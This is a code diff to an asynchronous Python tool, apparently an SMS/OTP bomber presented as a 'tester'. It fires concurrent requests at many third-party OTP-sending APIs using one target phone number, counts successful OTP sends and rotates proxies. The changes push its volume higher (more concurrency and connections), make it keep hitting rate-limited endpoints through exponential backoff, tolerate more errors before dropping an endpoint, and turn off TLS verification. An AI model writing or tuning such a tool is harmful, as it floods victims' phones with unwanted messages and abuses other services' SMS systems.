@@ -15,7 +15,7 @@ from helpers import replacePlaceholders
 
 
 # ---------------------------------------------------------------------------
-# OTP success detection — both 2xx AND keyword match required
+# OTP success detection
 # ---------------------------------------------------------------------------
 
 OTP_KEYWORDS = [
@@ -26,7 +26,6 @@ OTP_KEYWORDS = [
 ]
 
 def isConfirmedOtp(status: int, text: str) -> bool:
-    """True only if status is 2xx AND body contains a strong OTP keyword."""
     if status not in (200, 201, 202):
         return False
     t = text.lower()
@@ -37,7 +36,7 @@ def is2xx(status: int) -> bool:
 
 
 # ---------------------------------------------------------------------------
-# Per-API state during a test session
+# Per-API state
 # ---------------------------------------------------------------------------
 
 class ApiState:
@@ -45,18 +44,25 @@ class ApiState:
     RATELIMITED = "ratelimited"
     DEAD        = "dead"
 
+    # Exponential backoff bounds (seconds)
+    RL_BASE     = 30.0
+    RL_MAX      = 300.0
+    DEAD_STREAK = 5       # errors in a row before marking dead
+
     def __init__(self, name: str):
-        self.name          = name
-        self.status        = self.ACTIVE
-        self.cooldownUntil = 0.0
-        self.errorStreak   = 0
-        self.requests      = 0      # total requests this session
-        self.confirmed     = 0      # confirmed OTP sends
-        self.responses2xx  = 0      # 2xx but not confirmed OTP
-        self.rateLimits    = 0
-        self.errors        = 0
+        self.name           = name
+        self.status         = self.ACTIVE
+        self.cooldownUntil  = 0.0
+        self.errorStreak    = 0
+        self.rlCount        = 0       # how many times rate-limited this session
+        self.requests       = 0
+        self.confirmed      = 0
+        self.responses2xx   = 0
+        self.rateLimits     = 0
+        self.errors         = 0
         self.totalLatencyMs = 0.0
-        self.latencyCount  = 0
+        self.latencyCount   = 0
+        self._inFlight      = 0       # concurrent requests to this API right now
 
     def isAvailable(self) -> bool:
         if self.status == self.DEAD:
@@ -67,6 +73,10 @@ class ApiState:
                 return True
             return False
         return True
+
+    def cooldownDuration(self) -> float:
+        """Exponential backoff: 30s, 60s, 120s, 240s, capped at 300s."""
+        return min(self.RL_BASE * (2 ** self.rlCount), self.RL_MAX)
 
     def recordLatency(self, latencySeconds: float) -> None:
         self.totalLatencyMs += latencySeconds * 1000
@@ -84,11 +94,11 @@ class ApiState:
 
 class Stats:
     def __init__(self, apiNames: List[str]) -> None:
-        self.startTime   = time.time()
-        self.totalReqs   = 0
-        self.confirmed   = 0   # real confirmed OTPs
-        self.responses   = 0   # 2xx responses (not all are OTPs)
-        self.errors      = 0
+        self.startTime  = time.time()
+        self.totalReqs  = 0
+        self.confirmed  = 0
+        self.responses  = 0
+        self.errors     = 0
         self.apiStates: Dict[str, ApiState] = {n: ApiState(n) for n in apiNames}
         self._lock = asyncio.Lock()
 
@@ -107,6 +117,7 @@ class Stats:
             s.requests     += 1
             s.responses2xx += 1
             s.errorStreak   = 0
+            s._inFlight     = max(0, s._inFlight - 1)
             s.recordLatency(latency)
             if confirmed:
                 s.confirmed  += 1
@@ -118,6 +129,8 @@ class Stats:
             s = self.apiStates[name]
             s.requests    += 1
             s.rateLimits  += 1
+            s.rlCount     += 1
+            s._inFlight    = max(0, s._inFlight - 1)
 
     async def recordError(self, name: str) -> None:
         async with self._lock:
@@ -127,8 +140,14 @@ class Stats:
             s.requests    += 1
             s.errors      += 1
             s.errorStreak += 1
-            if s.errorStreak >= 3:
+            s._inFlight    = max(0, s._inFlight - 1)
+            if s.errorStreak >= ApiState.DEAD_STREAK:
                 s.status = ApiState.DEAD
+
+    async def trackInFlight(self, name: str, delta: int) -> None:
+        async with self._lock:
+            s = self.apiStates[name]
+            s._inFlight = max(0, s._inFlight + delta)
 
     def snapshot(self) -> dict:
         perApi = {}
@@ -150,31 +169,24 @@ class Stats:
             "elapsed":   round(self.elapsed(), 1),
             "rps":       self.rps(),
             "perApi":    perApi,
-            # legacy keys for history saving
             "total":     self.totalReqs,
             "otpSent":   self.confirmed,
         }
 
 
 # ---------------------------------------------------------------------------
-# Round-robin API queue with smart cooldown
+# Round-robin API queue with exponential backoff
 # ---------------------------------------------------------------------------
 
 class ApiQueue:
-    """
-    Maintains a round-robin queue of available APIs.
-    Rate-limited APIs get a 60s cooldown then re-enter.
-    Dead APIs (3 errors in a row) are removed for the session.
-    Skipped APIs (admin flagged) are never used.
-    """
-    RATELIMIT_COOLDOWN = 60.0
+    MAX_INFLIGHT_PER_API = 8   # max concurrent hits to a single API
 
-    def __init__(self, configs: List[dict], skipSet: set) -> None:
-        self._all     = [c for c in configs if c["name"] not in skipSet]
-        self._queue   = deque(self._all)
-        self._cooling: Dict[str, float] = {}   # name -> available_at
-        self._dead:    set = set()
-        self._lock    = asyncio.Lock()
+    def __init__(self, configs: List[dict], skipSet: set, stats: Stats) -> None:
+        self._all    = [c for c in configs if c["name"] not in skipSet]
+        self._queue  = deque(self._all)
+        self._dead:  set = set()
+        self._lock   = asyncio.Lock()
+        self._stats  = stats
 
     async def next(self) -> Optional[dict]:
         async with self._lock:
@@ -185,66 +197,92 @@ class ApiQueue:
             while checked < total:
                 if not self._queue:
                     return None
-                api = self._queue.popleft()
+                api  = self._queue.popleft()
                 name = api["name"]
 
                 if name in self._dead:
                     checked += 1
                     continue
 
-                coolUntil = self._cooling.get(name, 0)
-                if coolUntil > now:
-                    self._queue.append(api)  # put back at end
+                state = self._stats.apiStates.get(name)
+                if state is None:
+                    self._queue.append(api)
+                    return api
+
+                # Skip if cooling down
+                if state.status == ApiState.RATELIMITED:
+                    if time.time() < state.cooldownUntil:
+                        self._queue.append(api)
+                        checked += 1
+                        continue
+                    else:
+                        state.status = ApiState.ACTIVE
+
+                # Skip if dead
+                if state.status == ApiState.DEAD:
+                    self._dead.add(name)
                     checked += 1
                     continue
 
-                # Available — put it back at end for round-robin
+                # Per-API concurrency cap
+                if state._inFlight >= self.MAX_INFLIGHT_PER_API:
+                    self._queue.append(api)
+                    checked += 1
+                    continue
+
+                # Good to go
+                state._inFlight += 1
                 self._queue.append(api)
                 return api
 
-            return None  # all APIs cooling or dead
+            return None
 
     async def markRateLimited(self, name: str) -> None:
         async with self._lock:
-            self._cooling[name] = time.time() + self.RATELIMIT_COOLDOWN
+            state = self._stats.apiStates.get(name)
+            if state:
+                cooldown = state.cooldownDuration()
+                state.cooldownUntil = time.time() + cooldown
+                state.status        = ApiState.RATELIMITED
 
     async def markDead(self, name: str) -> None:
         async with self._lock:
             self._dead.add(name)
+            state = self._stats.apiStates.get(name)
+            if state:
+                state.status = ApiState.DEAD
 
     def activeCount(self) -> int:
         now  = time.time()
         dead = len(self._dead)
-        cooling = sum(1 for t in self._cooling.values() if t > now)
+        cooling = sum(
+            1 for s in self._stats.apiStates.values()
+            if s.status == ApiState.RATELIMITED and s.cooldownUntil > now
+        )
         return max(0, len(self._all) - dead - cooling)
 
 
 # ---------------------------------------------------------------------------
-# Core API caller
+# Type coercion after placeholder replacement
 # ---------------------------------------------------------------------------
 
-def coerceTypes(obj: any, original: any) -> any:
-    """
-    After replacePlaceholders turns everything into strings,
-    restore numeric types based on what the original config had.
-    E.g. if original had {"phone": 919876543210} (int), keep it as int after replacement.
-    """
+def coerceTypes(obj, original):
     if isinstance(original, dict) and isinstance(obj, dict):
         return {k: coerceTypes(obj.get(k, v), v) for k, v in original.items()}
     if isinstance(original, list) and isinstance(obj, list):
         return [coerceTypes(o, p) for o, p in zip(obj, original)]
     if isinstance(original, int) and isinstance(obj, str):
-        try:
-            return int(obj)
-        except (ValueError, TypeError):
-            return obj
+        try: return int(obj)
+        except (ValueError, TypeError): return obj
     if isinstance(original, float) and isinstance(obj, str):
-        try:
-            return float(obj)
-        except (ValueError, TypeError):
-            return obj
+        try: return float(obj)
+        except (ValueError, TypeError): return obj
     return obj
 
+
+# ---------------------------------------------------------------------------
+# Core API caller
+# ---------------------------------------------------------------------------
 
 async def callApi(
     session: aiohttp.ClientSession,
@@ -256,6 +294,8 @@ async def callApi(
 ) -> None:
     name = api["name"]
     if stopEvent.is_set():
+        # Decrement in-flight since we incremented in ApiQueue.next()
+        await stats.trackInFlight(name, -1)
         return
 
     try:
@@ -272,7 +312,9 @@ async def callApi(
             cfg["method"], url,
             headers=headers, params=params,
             json=jsonData, data=data, cookies=cookies,
-            timeout=aiohttp.ClientTimeout(total=6, connect=3),
+            timeout=aiohttp.ClientTimeout(total=8, connect=3),
+            allow_redirects=True,
+            ssl=False,
         ) as resp:
             latency = time.time() - t0
             text    = await resp.text()
@@ -287,14 +329,21 @@ async def callApi(
                 await stats.recordSuccess(name, latency, confirmed)
                 return
 
-            # 4xx/5xx — count as error streak
+            # 4xx/5xx
             await stats.recordError(name)
-            if stats.apiStates[name].errorStreak >= 3:
+            state = stats.apiStates.get(name)
+            if state and state.errorStreak >= ApiState.DEAD_STREAK:
                 await apiQueue.markDead(name)
 
     except asyncio.TimeoutError:
         await stats.recordError(name)
-        if stats.apiStates[name].errorStreak >= 3:
+        state = stats.apiStates.get(name)
+        if state and state.errorStreak >= ApiState.DEAD_STREAK:
+            await apiQueue.markDead(name)
+    except (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError):
+        await stats.recordError(name)
+        state = stats.apiStates.get(name)
+        if state and state.errorStreak >= ApiState.DEAD_STREAK:
             await apiQueue.markDead(name)
     except Exception:
         await stats.recordError(name)
@@ -314,7 +363,7 @@ async def testSingleApi(api: dict, phone: str) -> dict:
         cookies  = replacePlaceholders(cfg.get("cookies"), phone)
         url      = cfg["url"].replace("{phone}", phone)
 
-        connector = TCPConnector(limit=10)
+        connector = TCPConnector(limit=10, ssl=False)
         async with aiohttp.ClientSession(connector=connector) as session:
             t0 = time.time()
             async with session.request(
@@ -322,6 +371,7 @@ async def testSingleApi(api: dict, phone: str) -> dict:
                 headers=headers, params=params,
                 json=jsonData, data=data, cookies=cookies,
                 timeout=aiohttp.ClientTimeout(total=15),
+                allow_redirects=True,
             ) as resp:
                 latency = round((time.time() - t0) * 1000)
                 text    = await resp.text()
@@ -338,8 +388,7 @@ async def testSingleApi(api: dict, phone: str) -> dict:
     except aiohttp.ClientSSLError as e:
         return {"ok": False, "error": f"SSL error: {str(e)[:60]}"}
     except Exception as e:
-        err = str(e).strip() or type(e).__name__
-        return {"ok": False, "error": err[:80]}
+        return {"ok": False, "error": (str(e).strip() or type(e).__name__)[:80]}
 
 
 # ---------------------------------------------------------------------------
@@ -350,7 +399,10 @@ async def checkProxy(proxy: str) -> Optional[str]:
     try:
         connector = ProxyConnector.from_url(proxy)
         async with aiohttp.ClientSession(connector=connector) as session:
-            async with session.get("http://httpbin.org/ip", timeout=aiohttp.ClientTimeout(total=5)):
+            async with session.get(
+                "http://httpbin.org/ip",
+                timeout=aiohttp.ClientTimeout(total=5)
+            ):
                 return proxy
     except Exception:
         return None
@@ -374,10 +426,10 @@ class TesterRunner:
         useProxy: bool,
         proxyList: Optional[List[str]] = None,
     ) -> None:
-        self.phone     = phone
-        self.duration  = duration
-        self.workers   = workers
-        self.useProxy  = useProxy
+        self.phone      = phone
+        self.duration   = duration
+        self.workers    = workers
+        self.useProxy   = useProxy
         self._proxyList = proxyList or []
 
         from bot.services.api_manager import apiManager
@@ -385,22 +437,22 @@ class TesterRunner:
         self._apiConfigs = apiManager.getMergedConfigs()
         self._skipSet    = db.getSkippedApiNames()
 
-        self.stats       = Stats([a["name"] for a in self._apiConfigs])
-        self._stopEvent  = asyncio.Event()
+        self.stats      = Stats([a["name"] for a in self._apiConfigs])
+        self._stopEvent = asyncio.Event()
         self._tasks: List[asyncio.Task] = []
-        self._running    = False
-        self._endTime    = 0.0
+        self._running   = False
+        self._endTime   = 0.0
 
     @property
     def isRunning(self) -> bool:
         return self._running
 
     async def start(self) -> None:
-        self._running   = True
-        self._endTime   = time.time() + self.duration
+        self._running  = True
+        self._endTime  = time.time() + self.duration
         self._stopEvent.clear()
-        self.stats      = Stats([a["name"] for a in self._apiConfigs])
-        self._apiQueue  = ApiQueue(self._apiConfigs, self._skipSet)
+        self.stats     = Stats([a["name"] for a in self._apiConfigs])
+        self._apiQueue = ApiQueue(self._apiConfigs, self._skipSet, self.stats)
 
         proxyList: List[str] = []
         if self.useProxy and self._proxyList:
@@ -414,12 +466,9 @@ class TesterRunner:
             )
             self._tasks.append(task)
 
-        # Hard timer — sets stop event at exactly endTime
-        timer = asyncio.create_task(self._timer(), name="timer")
-        self._tasks.append(timer)
-
+        timer    = asyncio.create_task(self._timer(),    name="timer")
         watchdog = asyncio.create_task(self._watchdog(), name="watchdog")
-        self._tasks.append(watchdog)
+        self._tasks.extend([timer, watchdog])
 
     async def stop(self) -> None:
         self._stopEvent.set()
@@ -430,46 +479,54 @@ class TesterRunner:
         self._running = False
 
     async def _timer(self) -> None:
-        """Sets stop event at exact end time — guaranteed accurate stop."""
         delay = self._endTime - time.time()
         if delay > 0:
             await asyncio.sleep(delay)
         self._stopEvent.set()
 
     async def _watchdog(self) -> None:
-        """Marks runner as not running once all senders finish."""
         senderTasks = [t for t in self._tasks if t.get_name().startswith("sender_")]
         if senderTasks:
             await asyncio.gather(*senderTasks, return_exceptions=True)
         self._running = False
 
     async def _sender(self, proxy: Optional[str]) -> None:
-        connector = ProxyConnector.from_url(proxy) if proxy else TCPConnector(limit=200)
-        async with aiohttp.ClientSession(connector=connector) as session:
+        connector = ProxyConnector.from_url(proxy) if proxy else TCPConnector(
+            limit=300,
+            limit_per_host=20,
+            ttl_dns_cache=300,
+            ssl=False,
+        )
+        async with aiohttp.ClientSession(
+            connector=connector,
+            connector_owner=True,
+        ) as session:
             activeTasks: set = set()
 
             while not self._stopEvent.is_set():
+                # Clean up done tasks
                 activeTasks = {t for t in activeTasks if not t.done()}
 
-                if len(activeTasks) >= 40:
-                    await asyncio.sleep(0.05)
+                # Throttle: max 50 concurrent per worker
+                if len(activeTasks) >= 50:
+                    await asyncio.sleep(0.02)
                     continue
 
                 api = await self._apiQueue.next()
                 if api is None:
-                    await asyncio.sleep(1.0)  
+                    # All APIs cooling/dead — short sleep then retry
+                    await asyncio.sleep(0.5)
                     continue
 
                 task = asyncio.create_task(
                     callApi(session, api, self.phone, self.stats, self._apiQueue, self._stopEvent)
                 )
                 activeTasks.add(task)
+                # Tiny yield to allow event loop to breathe
                 await asyncio.sleep(0)
 
-            # Stop event fired — cancel everything immediately, don't wait for responses
+            # Stop fired — cancel all in-flight immediately
             for t in activeTasks:
                 t.cancel()
             if activeTasks:
                 await asyncio.gather(*activeTasks, return_exceptions=True)
-            # Close connector to abort any lingering TCP connections
-            await connector.close()
